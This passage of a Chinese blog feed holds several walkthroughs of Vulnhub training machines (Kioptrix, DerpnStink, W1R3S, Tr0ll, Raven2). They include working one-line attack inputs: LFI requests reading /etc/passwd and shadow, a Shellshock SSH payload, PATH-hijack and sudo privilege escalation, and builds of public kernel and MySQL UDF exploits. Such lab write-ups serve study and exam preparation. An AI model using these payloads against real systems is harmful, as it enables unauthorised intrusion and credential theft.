<p>curl –cookie “lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif” “<a href="http://192.168.0.104&quot;" target="_blank" rel="noopener">http://192.168.0.104&quot;</a></p>
<p>拿到了</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312231440117.png" alt="image-20200312231440117"></p>
<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’ 获取一个tty</p>
<p>用之前数据库里拿到的三个账号尝试登陆</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312231648685.png" alt="image-20200312231648685"></p>
<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>思路是这样的</p>
<p>1.从截图可以看到，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了</p>
<p>2.通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件</p>
<p>针对这种情况，我们可以通过设置bash的$path环境变量来利用</p>
<p>3.然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，</p>
<p>4.则会先从当前目录来寻找cat指令，相当于我们自己创建一个读文件的cat指令，用这个指令来</p>
<p>5.读新建取/home/mike/msg.txt文件，我们新建一个cat文件，并添加执行权限</p>
<p>6.这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，</p>
<p>我们就会提升到mike权限</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232750822.png" alt="image-20200312232750822"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232900069.png" alt="image-20200312232900069"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312232907099.png" alt="image-20200312232907099"></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix全集</title>
    <url>/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/</url>
    <content><![CDATA[<h1 id="0x00-Kioptrix-Level-1"><a href="#0x00-Kioptrix-Level-1" class="headerlink" title="0x00 Kioptrix_Level_1"></a><strong>0x00 Kioptrix_Level_1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307161830148.png" alt="image-20200307161830148"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307162355257.png" alt="image-20200307162355257"></p>
<p>利用Samba溢出</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307165821506.png" alt="image-20200307165821506"></p>
<p>还可以利用Apache OpenSSL漏洞溢出，不展示了。</p>
<h1 id="0x01-Kioptrix-Level-1-1"><a href="#0x01-Kioptrix-Level-1-1" class="headerlink" title="0x01 Kioptrix_Level_1.1"></a><strong>0x01 Kioptrix_Level_1.1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170524511.png" alt="image-20200307170524511"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170918034.png" alt="image-20200307170918034"></p>
<p>80的index.php web基础考试来了 想起了考pte的时候</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171747660.png" alt="image-20200307171747660"></p>
<p>命令执行</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171841255.png" alt="image-20200307171841255"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171849863.png" alt="image-20200307171849863"></p>
<p>那不客气了 bash弹shell 注意；因为前面的是ping</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172121951.png" alt="image-20200307172121951"></p>
<p>nc接到</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172251783.png" alt="image-20200307172251783"></p>
<p>提权 看下版本</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172603208.png" alt="image-20200307172603208"></p>
<p>这里我们用到了exploitdb的 <a href="https://www.exploit-db.com/download/9542" target="_blank" rel="noopener">https://www.exploit-db.com/download/9542</a></p>
<p>python3 -m http.server 9999 开个http</p>
<p>编译命令gcc -o 9542 9542.c</p>
<p>记得在tmp因为有执行权限这目录 源文件下载下来后缀改成.c编译完就是9542了</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307173559780.png" alt="image-20200307173559780"></p>
<p>闯关成功！</p>
<h1 id="0x02-Kioptrix-Level-1-2"><a href="#0x02-Kioptrix-Level-1-2" class="headerlink" title="0x02 Kioptrix_Level_1.2"></a><strong>0x02 Kioptrix_Level_1.2</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307174435555.png" alt="image-20200307174435555"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307175301323.png" alt="image-20200307175301323"></p>
<p>利用方式很多</p>
<ul>
<li>Gallarific<ul>
<li>gallery.php SQL Injection</li>
</ul>
</li>
<li>LotusCMS<ul>
<li>RCE</li>
<li>Code Inject</li>
</ul>
</li>
</ul>
<p>dirb开始 扫出挺多</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307180238145.png" alt="image-20200307180238145"></p>
<p>做下host</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181159138.png" alt="image-20200307181159138"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181450474.png" alt="image-20200307181450474"></p>
<p>msf我们用太多了 oscp考试限制msf使用的 那么这次我们从SQL Injection入手</p>
<p>在exploit-db上搜索Gallarific的漏洞</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181638504.png" alt="image-20200307181638504"></p>
<p>注入点：<a href="http://www.site.com/gallery.php?id=null" target="_blank" rel="noopener">www.site.com/gallery.php?id=null</a></p>
<p>sqlmap跑这个 <a href="http://192.168.0.106/gallery/gallery.php?id=1" target="_blank" rel="noopener">http://192.168.0.106/gallery/gallery.php?id=1</a></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181924830.png" alt="image-20200307181924830"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183256152.png" alt="image-20200307183256152"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183221579.png" alt="image-20200307183221579"></p>
<p>很久没升级sqlmap了….</p>
<p>md5解完就是Mast3r和starwars</p>
<p>loneferret / starwars 22走一波 </p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183819289.png" alt="image-20200307183819289"></p>
<p>根据提示 sudo ht</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185119942.png" alt="image-20200307185119942"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307184036261.png" alt="image-20200307184036261"></p>
<p>按F3 打开一个文件 /etc/passwd(或者/etc/sudoers) 编辑loneferrt那一行把1000和100 分别改为0，CTRL+W 保存，如图：</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185258898.png" alt="image-20200307185258898"></p>
<p>提权成功</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185504768.png" alt="image-20200307185504768"></p>
<h1 id="0x03-Kioptrix-Level-1-3"><a href="#0x03-Kioptrix-Level-1-3" class="headerlink" title="0x03 Kioptrix_Level_1.3"></a><strong>0x03 Kioptrix_Level_1.3</strong></h1><p>这个包下载下来是个vmdk</p>
<p>需要我们把上一个刚打完的虚拟机硬盘移除倒入这个</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191650536.png" alt="image-20200307191650536"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191852194.png" alt="image-20200307191852194"></p>
<p>看看80 先使用nmap通过NetBIOS枚举用户名</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307230439585.png" alt="image-20200307230439585"></p>
<p>扫出来的账户加万能密码尝试登陆</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231412153.png" alt="image-20200307231412153"></p>
<p>操作如下</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231835651.png" alt="image-20200307231835651"></p>
<p>数据库账号拿到</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231942745.png" alt="image-20200307231942745"></p>
<p>用<strong>sys_exec</strong>运行usermod命令来授予john管理员权限！</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307232351752.png" alt="image-20200307232351752"></p>
<p>Root 😘</p>
<h1 id="0x04-Kioptrix-2014"><a href="#0x04-Kioptrix-2014" class="headerlink" title="0x04 Kioptrix 2014"></a><strong>0x04 Kioptrix 2014</strong></h1><p>信息收集</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230108891.png" alt="image-20200308230108891"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230743780.png" alt="image-20200308230743780"></p>
<p>仅有80和8080端口开着，用的还是Apache 2.2.21服务的</p>
<p>看来这把是考纯web啊 </p>
<p>80啥也没有 8080有限制，什么时候都要看下robots和源码 发现了隐藏路径</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230928179.png" alt="image-20200308230928179"></p>
<p>pChart后台</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231027189.png" alt="image-20200308231027189"></p>
<p>kali搜下漏洞 看下exp了解到是本地文件包含 那就包吧</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231214272.png" alt="image-20200308231214272"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231309781.png" alt="image-20200308231309781"></p>
<p>利用方式</p>
<p>hxxp://localhost/examples/index.php？Action=View&amp;Script=%2f..%2f..%2fetc/passwd</p>
<p>成了</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231522658.png" alt="image-20200308231522658"></p>
<p>同理再看下apache配置 为啥8080 ban我 </p>
<p>哦😯 火狐4.0的UA就可以了 我这用的是google的插件</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231744308.png" alt="image-20200308231744308"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232050054.png" alt="image-20200308232050054"></p>
<p>phptax远程代码执行漏洞</p>
<p>msf干净利索</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232653182.png" alt="image-20200308232653182"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232732265.png" alt="image-20200308232732265"></p>
<p>差个提权 用的FreeBSD 9.0</p>
<p>kali再搜一下 nc传文件</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235321104.png" alt="image-20200308235321104"></p>
<p>如下操作提权成功</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235715954.png" alt="image-20200308235715954"></p>
<p>至此Kioptrix剧中😘</p>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DerpnStink</title>
    <url>/2020/03/06/DerpnStink/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/06/DerpnStink/image-20200306214933101.png" alt="image-20200306214933101"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215044988.png" alt="image-20200306215044988"></p>
<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>80端口网页源代码112行</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215212457.png" alt="image-20200306215212457"></p>
<h1 id="0x02-获取shell"><a href="#0x02-获取shell" class="headerlink" title="0x02 获取shell"></a><strong>0x02 获取shell</strong></h1><p>dirb爆破一下 发现weblog路径</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215516647.png" alt="image-20200306215516647"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215733208.png" alt="image-20200306215733208"></p>
<p>不行 看下之前的源码</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215758832.png" alt="image-20200306215758832"></p>
<p>添加本地hosts 根据提示</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215812440.png" alt="image-20200306215812440"></p>
<p>访问后发现是个wordpress 后台常规路径是wp-admin  弱密码admin admin</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220237585.png" alt="image-20200306220237585"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220348156.png" alt="image-20200306220348156"></p>
<p>admin都进去了 那就上msf吧</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220953586.png" alt="image-20200306220953586"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221116509.png" alt="image-20200306221116509"></p>
<p>拿到shell</p>
<h1 id="0x03-flag2"><a href="#0x03-flag2" class="headerlink" title="0x03 flag2"></a><strong>0x03 flag2</strong></h1><p>cat /var/www/html/weblog/wp-config.php</p>
<p>数据库的账号密码拿到</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221339387.png" alt="image-20200306221339387"></p>
<p>其实是有phpmyadmin目录的 第一次爆的时候我为了速度就中断了 我们访问下</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221712863.png" alt="image-20200306221712863"></p>
<p>有个hash </p>
<p>john爆破暴破出的用户名/密码：unclestinky/wedgie57 </p>
<p>登录 wordpress flag2到手</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222011578.png" alt="image-20200306222011578"></p>
<h1 id="0x04-flag3"><a href="#0x04-flag3" class="headerlink" title="0x04 flag3"></a><strong>0x04 flag3</strong></h1><p>如图 基操（用新用户）</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222352388.png" alt="image-20200306222352388"></p>
<h1 id="0x05-flag4"><a href="#0x05-flag4" class="headerlink" title="0x05 flag4"></a><strong>0x05 flag4</strong></h1><p>使用 ftp 登录系统 stinky/wedgie57，下载pcap包</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222737324.png" alt="image-20200306222737324"></p>
<p>发现ftp根目录是files 用shell移过去 pcap在desktop的同级目录documents下</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306223312113.png" alt="image-20200306223312113"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306223453873.png" alt="image-20200306223453873"></p>
<p>那就分析下吧</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306225549075.png" alt="image-20200306225549075"></p>
<p>另一个账号的用户名和密码为： mrderp / derpderpderpderpderpderpderp</p>
<p>ssh上去 枚举系统发现提示信息</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306225938339.png" alt="image-20200306225938339"></p>
<p>sudo一下</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306230341042.png" alt="image-20200306230341042"></p>
<p>以上信息 /home/mrderp/binaries/derpy* 中：binaries 目录中的以 derpy 开头的可执行文件具有root权限。创建文件以提权</p>
<p>ok看到了黎明前的曙光</p>
<h1 id="0x06-提权-拿到flag4"><a href="#0x06-提权-拿到flag4" class="headerlink" title="0x06 提权 拿到flag4"></a><strong>0x06 提权 拿到flag4</strong></h1><p>/home/mrderp/下创建binaries目录 再创建derpy.sh 把/bin/bash echo进去 如图</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306231054176.png" alt="image-20200306231054176"></p>
<p>ok 下一篇见</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>W1R3S</title>
    <url>/2020/03/05/W1R3S/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305194543215.png" alt="image-20200305194543215"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305194857422.png" alt="image-20200305194857422"></p>
<p>四个端口 80开始</p>
<p>apache的页面 那就扫一下喽 gobuster</p>
<p><img src="/2020/03/05/W1R3S/image-20200305194943070.png" alt="image-20200305194943070"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305195911173.png" alt="image-20200305195911173"></p>
<p>/wordpress和/administrator突破点</p>
<p>访问了wordpress，也是没什么东西。</p>
<p>于是访问/administrator，发现cms是cuppa 既然cms都给了 那作者肯定是想要漏洞利用了 kali搜下</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200011816.png" alt="image-20200305200011816"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305200112394.png" alt="image-20200305200112394"></p>
<p>根据文件提示发现有lfi漏洞，根据提示构造url</p>
<p>curl -s –data-urlencode urlConfig=../../../../../../../../../etc/passwd <a href="http://192.168.0.102/administrator/alerts/alertConfigField.php" target="_blank" rel="noopener">http://192.168.0.102/administrator/alerts/alertConfigField.php</a> </p>
<p>再换成shadow试试</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200412146.png" alt="image-20200305200412146"></p>
<p>john破一下</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200716703.png" alt="image-20200305200716703"> </p>
<p>w1r3s用户computer ssh上去</p>
<h1 id="0x01-成功登陆"><a href="#0x01-成功登陆" class="headerlink" title="0x01 成功登陆"></a><strong>0x01 成功登陆</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305202128901.png" alt="image-20200305202128901"></p>
<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>这我就笑了 密码一样的 sudo -l</p>
<p><img src="/2020/03/05/W1R3S/image-20200305202345800.png" alt="image-20200305202345800"></p>
<p>这个靶机比较简单 因为准备oscp考试 大佬给的目标34台 按顺序做 </p>
<p>吃外卖去了 北京吃不完的外卖….</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll: 2</title>
    <url>/2020/03/03/Tr0ll-2/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>双生姊妹第二篇</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303213215791.png" alt="image-20200303213215791"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303213349966.png" alt="image-20200303213349966"></p>
<p>可以在上面看到Nmap找到开放了21、22、80端口</p>
<p>看下80 查看源码发现了作者的名字 除此之外没什么 不过后面会用到的 留着</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303214727575.png" alt="image-20200303214727575"></p>
<p>ftp进去 用户密码都是作者名</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220321566.png" alt="image-20200303220321566"></p>
<p>里面发现个l mao.zip下载下来解压发现有密码 先留着  robots.txt发现很多目录 可以保存下来 用dirb做字典扫一下 </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220724680.png" alt="image-20200303220724680"></p>
<p>结果 </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220804705.png" alt="image-20200303220804705"></p>
<p>这个路径我们可以深入搞一下 源码里还藏了个图片 </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220902152.png" alt="image-20200303220902152"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220954440.png" alt="image-20200303220954440"></p>
<p>拖片wget下来 tail标准输出下 好像在打ctf….</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221204273.png" alt="image-20200303221204273"></p>
<p>照着他的话做喽 访问下路径 发现密码本 都是base64 解一下拿去爆之前那个zip</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221324637.png" alt="image-20200303221324637"></p>
<p>使用fcrackzip工具（专门用来破解zip密码）<br>PASSWORD FOUND!!!: pw == ItCantReallyBeThisEasyRightLOL</p>
<p>解出来的 cat一下发现是ssh密钥 试了一下</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221853545.png" alt="image-20200303221853545"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303222203450.png" alt="image-20200303222203450"></p>
<p>这里的意思是，链接失效了，可以登录需要外壳拿权限</p>
<p>方法在这里 <a href="https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh</a></p>
<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p>命令 ：ssh <a href="mailto:noob@192.168.0.104">noob@192.168.0.104</a> -i noob -t “() { :;}; /bin/bash”</p>
<p>多试试 看我多惨…</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223053104.png" alt="image-20200303223053104"></p>
<p>我们使用exploit进行命令注入攻击拿到反弹shell在本地上</p>
<p>如图搞就行</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223538369.png" alt="image-20200303223538369"></p>
<p>使用python -c ‘import pty; pty.spawn(“/bin/bash”)’进入noob用户</p>
<p>然后命令：find / -perm -4000 2&gt;/dev/null<br>使用find查看底层目录</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223952517.png" alt="image-20200303223952517"></p>
<p>缓冲区溢出….</p>
<p>命令：gdb -q r00t（加载执行r00t程序发生溢出时来跟踪EIP的值）<br>命令：set disassembly-flavor intel（转换为intel格式的汇编）<br>命令：disas main（显示main函数对应的汇编代码）</p>
<p>三个门 不同的三个功能 我们是需要最大的文件也就是返回用户输出功能的</p>
<p>明天再搞 </p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll: 1</title>
    <url>/2020/03/02/Tr0ll-1/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>这次又是双生 第一篇</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200318055.png" alt="image-20200302200318055"></p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200434911.png" alt="image-20200302200434911"></p>
<p>80端口</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200447964.png" alt="image-20200302200447964"></p>
<p>dirb扫一下</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200828953.png" alt="image-20200302200828953"></p>
<p>查看下robots</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200912404.png" alt="image-20200302200912404"></p>
<p>访问下 哎我去 挑衅？看我一会儿拿下给你加密一下  80不行转战FTP</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302201028285.png" alt="image-20200302201028285"></p>
<p>ftp拿下pcap文件 分析下 有个账号 另一个包还有个不知道是啥的 也许是目录</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203253733.png" alt="image-20200302203253733"></p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203348293.png" alt="image-20200302203348293"></p>
<p>果然是个目录</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203453329.png" alt="image-20200302203453329"></p>
<p>下载 搜下字符</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203744541.png" alt="image-20200302203744541"></p>
<p>哎 心累 再去访问下 终于知道直男男朋友送套娃 女生心里是怎么想的了</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203917895.png" alt="image-20200302203917895"></p>
<p>第一个是账号</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204142840.png" alt="image-20200302204142840"></p>
<p>第二个是密码</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204207188.png" alt="image-20200302204207188"></p>
<p>密码固定 用户就hydra用来做字典跑一下 结果用户是overflow 还溢出…</p>
<p>不行呢！头脑风暴一下 这个作者我是真服 good job是对我说的 那就是目录名字就是密码呗</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204733348.png" alt="image-20200302204733348"></p>
<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p><img src="/2020/03/02/Tr0ll-1/image-20200302204912179.png" alt="image-20200302204912179"></p>
<p>….我还能说什么</p>
<h1 id="0x02-内核提权"><a href="#0x02-内核提权" class="headerlink" title="0x02 内核提权"></a><strong>0x02 内核提权</strong></h1><p>根据内核 kali搜下exp</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302205724077.png" alt="image-20200302205724077"></p>
<p>cp过来 python3开个http</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210024549.png" alt="image-20200302210024549"></p>
<p>wget落地 要去tmp /下不让写入</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210247114.png" alt="image-20200302210247114"></p>
<p>编译运行 提权成功</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210414249.png" alt="image-20200302210414249"></p>
<p>还有很多方法如计划任务反弹 大家可以自行试下 </p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Raven2</title>
    <url>/2020/03/02/Raven2/</url>
    <content><![CDATA[<h1 id="0x00-书接上回"><a href="#0x00-书接上回" class="headerlink" title="0x00 书接上回"></a><strong>0x00 书接上回</strong></h1><p>Raven第二部其实就是Raven1的加固版 要利用phpmalier远程代码执行漏洞（CVE-2016-10033）</p>
<p>前期的那些发现步骤我们就不做赘述了 没看过的师傅们可以去看下我的Raven1那章</p>
<h1 id="0x01-phpmailer远程代码执行"><a href="#0x01-phpmailer远程代码执行" class="headerlink" title="0x01 phpmailer远程代码执行"></a><strong>0x01 phpmailer远程代码执行</strong></h1><p>在 <a href="http://192.168.8.126/vendor/PATH" target="_blank" rel="noopener">http://192.168.8.126/vendor/PATH</a> 发现第一个flag和网站根路径：/var/www/html/</p>
<p><img src="/2020/03/02/Raven2/image-20200302142612649.png" alt="image-20200302142612649"></p>
<p>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</p>
<p>在 <a href="http://192.168.0.102/vendor/VERSION" target="_blank" rel="noopener">http://192.168.0.102/vendor/VERSION</a> 发现版本号</p>
<p>在kali中 searchsploit phpmailer 这个py在我们的射程内</p>
<p><img src="/2020/03/02/Raven2/image-20200302143039705.png" alt="image-20200302143039705"></p>
<p>cp过来 改下代码  大家都懂 </p>
<p><img src="/2020/03/02/Raven2/image-20200302143133899.png" alt="image-20200302143133899"></p>
<p><img src="/2020/03/02/Raven2/image-20200302143547074.png" alt="image-20200302143547074"></p>
<p>访问这个路径自动生成backdoor里你填的文件 访问就会执行payload nc提前接着</p>
<p><img src="/2020/03/02/Raven2/image-20200302144032371.png" alt="image-20200302144032371"></p>
<p>python切换到交互式shell</p>
<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
<p>find找flag 访问 我们目标拿root 不赘述了</p>
<p><img src="/2020/03/02/Raven2/image-20200302144523146.png" alt="image-20200302144523146"></p>
<p><img src="/2020/03/02/Raven2/image-20200302144539076.png" alt="image-20200302144539076"></p>
<h1 id="0x02-登数据库"><a href="#0x02-登数据库" class="headerlink" title="0x02 登数据库"></a><strong>0x02 登数据库</strong></h1><p>还是老规矩 wordpress配置文件拿帐号 </p>
<p><img src="/2020/03/02/Raven2/image-20200302144755036.png" alt="image-20200302144755036"></p>
<p>登上去后 Raven1里是表里拿帐号解密 ssh 这里不行 就不展示了 要走mysql udf提权</p>
<h1 id="0x03-mysql-udf提权"><a href="#0x03-mysql-udf提权" class="headerlink" title="0x03 mysql udf提权"></a><strong>0x03 mysql udf提权</strong></h1><p>Exploit-db 🔗 <a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1518</a></p>
<p>kali搜一下也行 </p>
<p><img src="/2020/03/02/Raven2/image-20200302145836960.png" alt="image-20200302145836960"></p>
<p>本地编译</p>
<p>gcc -g -c 1518.c</p>
<p>gcc -g -shared -o  1518.so 1518.o -lc</p>
<p><img src="/2020/03/02/Raven2/image-20200302150816621.png" alt="image-20200302150816621"></p>
<p>开个http wget落地</p>
<p>开始提权</p>
<p>照着操作即可</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">4</span> <span class="function">rows <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; use wordpress</span>;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of 